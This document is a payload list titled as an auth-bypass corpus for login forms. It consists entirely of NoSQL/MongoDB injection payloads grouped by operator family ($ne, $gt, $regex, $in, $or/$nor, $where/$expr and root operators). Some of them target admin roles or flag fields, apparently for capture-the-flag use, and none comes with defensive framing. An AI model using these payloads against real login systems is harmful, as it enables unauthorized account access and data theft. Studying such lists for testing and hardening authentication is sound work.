# Auth-bypass payloads — the login-side corpus

## The `$ne` family — the not-equal

```json
{"user": {"$ne": null}, "pass": {"$ne": null}}
{"user": {"$ne": ""}, "pass": {"$ne": ""}}
{"user": {"$ne": "x"}, "pass": {"$ne": "x"}}
{"user": {"$ne": "nobody"}, "pass": {"$ne": null}}
{"user": {"$ne": null}, "pass": {"$ne": null}, "admin": true}
{"user": {"$ne": null}, "pass": {"$ne": null}, "role": "admin"}
{"user": {"$ne": null}, "pass": {"$ne": null}, "isAdmin": true}
{"user": {"$ne": null}, "pass": {"$ne": null}, "is_admin": true}
{"user": {"$ne": null}, "pass": {"$ne": null}, "flag": {"$exists": true}}
{"user": {"$ne": null}, "pass": {"$ne": null}, "secret": {"$ne": null}}
{"user": {"$ne": null}, "pass": {"$ne": null}, "token": {"$ne": null}}
{"user": {"$ne": null}, "pass": {"$ne": null}, "key": {"$ne": null}}
{"user": {"$ne": null}, "pass": {"$ne": null}, "0": {"$ne": null}}
{"user": {"$ne": null}, "pass": {"$ne": null}, "1": {"$ne": null}}
{"user": {"$ne": null}, "pass": {"$ne": null}, "$comment": "x"}
{"user": {"$ne": null}, "pass": {"$ne": null}, "$where": "true"}
{"user": {"$ne": null}, "pass": {"$ne": null}, "$expr": {"$eq": [1, 1]}}
{"user": {"$ne": null}, "pass": {"$ne": null}, "$expr": {"$gt": [1, 0]}}
{"user": {"$ne": null}, "pass": {"$ne": null}, "$expr": {"$gte": [1, 1]}}
{"user": {"$ne": null}, "pass": {"$ne": null}, "$expr": {"$in": [1, [1]]}}
{"user": {"$ne": null}, "pass": {"$ne": null}, "$expr": {"$ne": [1, 2]}}
```

## The `$gt`/`$gte` family — the non-empty

```json
{"user": {"$gt": ""}, "pass": {"$gt": ""}}
{"user": {"$gte": ""}, "pass": {"$gte": ""}}
{"user": {"$gt": null}, "pass": {"$gt": null}}
{"user": {"$gt": 0}, "pass": {"$gt": 0}}
{"user": {"$gte": 0}, "pass": {"$gte": 0}}
{"user": {"$gt": "a"}, "pass": {"$gt": "a"}}
{"user": {"$gt": "m"}, "pass": {"$gt": "m"}}
{"user": {"$gt": "admin"}, "pass": {"$gt": ""}}
{"user": {"$gte": "a"}, "pass": {"$gte": ""}}
{"user": {"$lt": "z"}, "pass": {"$lt": "z"}}
{"user": {"$lte": "z"}, "pass": {"$lte": "z"}}
{"user": {"$gt": ""}, "pass": {"$gt": ""}, "admin": true}
{"user": {"$gt": ""}, "pass": {"$gt": ""}, "role": "admin"}
{"user": {"$gt": ""}, "pass": {"$gt": ""}, "flag": {"$exists": true}}
{"user": {"$gt": ""}, "pass": {"$gt": ""}, "$or": [{"a": 1}]}
{"user": {"$gt": ""}, "pass": {"$gt": ""}, "$and": [{"a": 1}]}
{"user": {"$gt": ""}, "pass": {"$gt": ""}, "$expr": {"$eq": [1, 1]}}
{"user": {"$gt": ""}, "pass": {"$gt": ""}, "$where": "true"}
{"user": {"$gt": ""}, "pass": {"$gt": ""}, "$comment": "x"}
{"user": {"$gt": ""}, "pass": {"$gt": ""}, "$type": "object"}
```

## The `$regex` family — the partial-match

```json
{"user": {"$regex": "^a"}, "pass": {"$regex": "^a"}}
{"user": {"$regex": "^admin"}, "pass": {"$regex": "^a"}}
{"user": {"$regex": "admin"}, "pass": {"$regex": "x"}}
{"user": {"$regex": "^ad"}, "pass": {"$regex": "^a"}}
{"user": {"$regex": "min"}, "pass": {"$regex": ""}}
{"user": {"$regex": "a|b"}, "pass": {"$regex": "."}}
{"user": {"$regex": ".*"}, "pass": {"$regex": ".*"}}
{"user": {"$regex": "^."}, "pass": {"$regex": "^."}}
{"user": {"$regex": "^.{1,}"}, "pass": {"$regex": "^.{1,}"}}
{"user": {"$regex": "^.{0,}"}, "pass": {"$regex": "^.{0,}"}}
{"user": {"$regex": "^.{1,100}$"}, "pass": {"$regex": "^.{1,100}$"}}
{"user": {"$regex": "^(a|b|c|d|e|f)"}, "pass": {"$regex": "^(a|b|c|d|e|f)"}}
{"user": {"$regex": "^[a-z]"}, "pass": {"$regex": "^[a-z]"}}
{"user": {"$regex": "^[a-z0-9]"}, "pass": {"$regex": "^[a-z0-9]"}}
{"user": {"$regex": "^\\w"}, "pass": {"$regex": "^\\w"}}
{"user": {"$regex": "^\\S"}, "pass": {"$regex": "^\\S"}}
{"user": {"$regex": ".", "$options": "s"}, "pass": {"$regex": ".", "$options": "s"}}
{"user": {"$regex": "^a", "$options": "i"}, "pass": {"$regex": "^a", "$options": "i"}}
{"user": {"$regex": "^admin", "$options": "i"}, "pass": {"$regex": "^a", "$options": "i"}}
{"user": {"$regex": "^FLAG", "$options": "i"}, "pass": {"$regex": "^a", "$options": "i"}}
{"user": {"$regex": "^flag\\{", "$options": "i"}, "pass": {"$regex": "^a", "$options": "i"}}
```

## The `$in`/`$nin` family — the set

```json
{"user": {"$in": ["admin", "root"]}, "pass": {"$in": ["x", "y"]}}
{"user": {"$in": ["admin", "root", "system"]}, "pass": {"$in": ["x"]}}
{"user": {"$in": ["a"]}, "pass": {"$in": ["b"]}}
{"user": {"$nin": ["a", "b"]}, "pass": {"$nin": ["x"]}}
{"user": {"$nin": []}, "pass": {"$nin": []}}
{"user": {"$nin": [""]}, "pass": {"$nin": [""]}}
{"user": {"$nin": [null]}, "pass": {"$nin": [null]}}
{"user": {"$in": ["admin"]}, "pass": {"$ne": null}}
{"user": {"$in": ["a", "b"]}, "pass": {"$gt": ""}}
{"user": {"$in": ["admin"]}, "pass": {"$regex": "^a"}}
{"user": {"$in": ["admin"]}, "pass": {"$exists": true}}
{"user": {"$in": ["admin"]}, "pass": {"$type": "string"}}
{"user": {"$all": ["a"]}, "pass": {"$all": ["b"]}}
{"user": {"$all": ["admin", "root"]}, "pass": {"$all": ["x"]}}
{"user": {"$all": []}, "pass": {"$all": []}}
{"user": {"$all": [[]]}, "pass": {"$all": [[]]}}
```

## The `$or`/`$and`/`$nor` family — the logical

```json
{"$or": [{"user": "admin"}, {"user": "x"}], "pass": {"$ne": null}}
{"$or": [{"user": {"$ne": null}}, {"user": "x"}], "pass": {"$ne": null}}
{"$or": [{"user": "admin"}, {"user": "root"}], "pass": {"$ne": null}}
{"$or": [{"user": "admin"}], "pass": {"$ne": null}}
{"$or": [{"user": {"$ne": null}}], "pass": {"$ne": null}}
{"$or": [{"user": {"$ne": null}}, {"$where": "true"}], "pass": {"$ne": null}}
{"$or": [{"user": {"$ne": null}}, {"$expr": {"$eq": [1, 1]}}], "pass": {"$ne": null}}
{"$or": [{"user": {"$ne": null}}, {"a": {"$ne": null}}], "pass": {"$ne": null}}
{"$or": [{"user": {"$ne": null}}, {}], "pass": {"$ne": null}}
{"$and": [{"user": {"$ne": null}}, {"pass": {"$ne": null}}]}
{"$and": [{"user": "admin"}, {"pass": {"$ne": null}}]}
{"$and": [{"user": {"$ne": null}}], "pass": {"$ne": null}}
{"$and": [{"user": {"$ne": null}}, {"role": {"$ne": null}}], "pass": {"$ne": null}}
{"$nor": [{"user": "x"}], "pass": {"$ne": null}}
{"$nor": [{"user": "nobody"}], "pass": {"$ne": null}}
{"$nor": [{"user": {"$ne": null}}], "pass": {"$ne": null}}
{"$nor": [{"user": "a"}, {"user": "b"}], "pass": {"$ne": null}}
{"$not": {"user": {"$eq": "x"}}, "pass": {"$ne": null}}
{"user": {"$not": {"$eq": "x"}}, "pass": {"$not": {"$eq": "x"}}}
{"user": {"$not": {"$eq": null}}, "pass": {"$not": {"$eq": null}}}
{"user": {"$not": {"$regex": "^x"}}, "pass": {"$not": {"$regex": "^x"}}}
{"user": {"$not": {"$in": ["x"]}}, "pass": {"$not": {"$in": ["x"]}}}
{"user": {"$not": {"$nin": ["x"]}}, "pass": {"$not": {"$nin": ["x"]}}}
{"user": {"$not": {"$exists": false}}, "pass": {"$not": {"$exists": false}}}
{"user": {"$not": {"$not": {"$ne": null}}}, "pass": {"$not": {"$not": {"$ne": null}}}}
```

## The `$where`/`$expr` family — the JS-side

```json
{"user": "admin", "$where": "this.pass"}
{"user": "admin", "$where": "this.pass.length > 0"}
{"user": "admin", "$where": "this.pass != null"}
{"user": "admin", "$where": "this.pass != ''"}
{"user": "admin", "$where": "this.pass != 'x'"}
{"user": "admin", "$where": "this.pass !== 'x'"}
{"user": "admin", "$where": "this.pass == this.pass"}
{"user": "admin", "$where": "this.pass === this.pass"}
{"user": "admin", "$where": "this.pass !== undefined"}
{"user": "admin", "$where": "true"}
{"user": "admin", "$where": "1 == 1"}
{"user": "admin", "$where": "1 === 1"}
{"user": "admin", "$where": "this.pass || true"}
{"user": "admin", "$where": "this.pass ? true : true"}
{"user": "admin", "$where": "function() { return true; }"}
{"user": "admin", "$where": "() => true"}
{"user": "admin", "$where": "return true"}
{"user": "admin", "$where": "return this.pass"}
{"user": "admin", "$where": "return this.pass.length"}
{"user": "admin", "$where": "return this.pass !== undefined"}
{"user": "admin", "$expr": {"$eq": ["$pass", "$pass"]}}
{"user": "admin", "$expr": {"$eq": [{"$type": "$pass"}, "string"]}}
{"user": "admin", "$expr": {"$eq": [{"$strLenCP": "$pass"}, {"$strLenCP": "$pass"}]}}
{"user": "admin", "$expr": {"$gt": [{"$strLenCP": "$pass"}, 0]}}
{"user": "admin", "$expr": {"$gte": [{"$strLenCP": "$pass"}, 1]}}
{"user": "admin", "$expr": {"$ne": [{"$strLenCP": "$pass"}, 0]}}
{"user": "admin", "$expr": {"$in": [{"$type": "$pass"}, ["string"]]}}
{"user": "admin", "$expr": {"$eq": [{"$ifNull": ["$pass", "x"]}, "$pass"]}}
{"user": "admin", "$expr": {"$eq": [{"$ifNull": ["$pass", "x"]}, {"$ifNull": ["$pass", "x"]}]}}
{"user": "admin", "$expr": {"$eq": [{"$or": [{"$eq": ["$pass", "x"]}, true]}, true]}}
{"user": "admin", "$expr": {"$eq": [{"$and": [true, true]}, true]}}
{"user": "admin", "$expr": {"$eq": [{"$not": [false]}, true]}}
{"user": "admin", "$expr": {"$eq": [{"$not": [0]}, true]}}
{"user": "admin", "$expr": {"$eq": [{"$not": [""]}, true]}}
{"user": "admin", "$expr": {"$eq": [{"$not": [null]}, true]}}
{"user": "admin", "$expr": {"$eq": [{"$not": [false, false]}, true]}}
{"user": "admin", "$expr": {"$eq": [{"$not": [[false]]}, true]}}
{"user": "admin", "$expr": {"$eq": [{"$not": [{"$eq": ["$pass", "x"]}]}, true]}}
{"user": "admin", "$expr": {"$eq": [{"$not": [{"$eq": ["$pass", "x"]}]}, true]}}
{"user": "admin", "$expr": {"$eq": [{"$not": [{"$in": ["$pass", ["x"]]}]}, true]}}
{"user": "admin", "$expr": {"$eq": [{"$not": [{"$in": ["$pass", ["x"]]}]}, true]}}
{"user": "admin", "$expr": {"$eq": [{"$not": [{"$eq": ["$pass", "x"]}]}, true]}}
{"user": "admin", "$expr": {"$eq": [{"$not": [{"$gt": ["$pass", "x"]}]}, true]}}
{"user": "admin", "$expr": {"$eq": [{"$not": [{"$lt": ["$pass", "x"]}]}, true]}}
{"user": "admin", "$expr": {"$eq": [{"$not": [{"$regexMatch": {"input": "$pass", "regex": "^x"}}]}, true]}}
{"user": "admin", "$expr": {"$eq": [{"$not": [{"$regexMatch": {"input": "$pass", "regex": "^x"}}]}, true]}}
```

## The top-level `$` — the root-operators

```json
{"$where": "true"}
{"$where": "1 == 1"}
{"$where": "return true"}
{"$where": "this.user == 'admin'"}
{"$where": "this.pass[0] == 'f'"}
{"$expr": {"$eq": [1, 1]}}
{"$expr": {"$gt": [1, 0]}}
{"$expr": {"$eq": [{"$substrCP": ["$pass", 0, 1]}, "f"]}}
{"$expr": {"$eq": [{"$strLenCP": "$pass"}, 32]}}
{"$expr": {"$regexMatch": {"input": "$pass", "regex": "^a"}}}
{"$or": [{"user": "admin"}, {"user": "x"}]}
{"$and": [{"user": "admin"}, {"pass": {"$ne": null}}]}
{"$nor": [{"user": "nobody"}]}
{"$text": {"$search": "admin"}}
{"$comment": "x"}
{"$natural": 1}
{"$orderby": {"user": 1}}
{"$hint": {"user": 1}}
{"$maxScan": 100}
{"$snapshot": true}
{"$readPreference": {"mode": "primary"}}
```
